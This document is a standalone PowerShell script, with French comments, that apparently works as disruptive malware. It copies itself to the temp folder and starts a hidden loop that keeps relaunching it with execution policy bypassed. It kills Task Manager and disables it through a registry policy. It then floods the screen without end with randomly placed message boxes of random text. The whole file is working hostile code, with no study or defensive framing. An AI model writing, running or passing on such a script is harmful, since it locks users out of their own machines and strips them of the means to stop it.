Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("user32.dll")]
    public static extern int MessageBox(IntPtr hWnd, string text, string caption, int options);
    [DllImport("user32.dll")]
    public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
}
"@ -Language CSharp

$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/~`"
$rand = New-Object System.Random
$null = [System.Windows.Forms.Screen]::PrimaryScreen

# Crée un processus PowerShell caché qui relance le script si tu essaies de le fermer
$scriptPath = "$env:TEMP\chaos.ps1"
$lockScript = @"
while (`$true) {
    Start-Process -WindowStyle Hidden -FilePath "powershell" -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`""
    Start-Sleep 5
}
"@
$lockScript | Out-File -Encoding ASCII "$env:TEMP\lock.ps1"
Start-Process -WindowStyle Hidden -FilePath "powershell" -ArgumentList "-ExecutionPolicy Bypass -File `"$env:TEMP\lock.ps1`""

$MyInvocation.MyCommand.Path | Copy-Item -Destination $scriptPath -Force


Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c taskkill /IM taskmgr.exe /F"
Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f"

while ($true) {
    Start-Job -ScriptBlock {
        param($chars, $rand)
        $title = -join ((1..$rand.Next(5,15)) | ForEach-Object { $chars[$rand.Next($chars.Length)] })
        $message = -join ((1..$rand.Next(10,30)) | ForEach-Object { $chars[$rand.Next($chars.Length)] })
        $handle = [WinAPI]::MessageBox([IntPtr]::Zero, $message, $title, 0)
        Start-Sleep -Milliseconds 100
        $hWnd = [WinAPI]::FindWindow($null, $title)
        if ($hWnd -ne [IntPtr]::Zero) {
            $x = $rand.Next(0, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width - 200)
            $y = $rand.Next(0, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height - 100)
            [WinAPI]::SetWindowPos($hWnd, [IntPtr]::Zero, $x, $y, 0, 0, 1)
        }
    } -ArgumentList $chars, $rand
    Start-Sleep -Milliseconds (50 + $rand.Next(200))
}
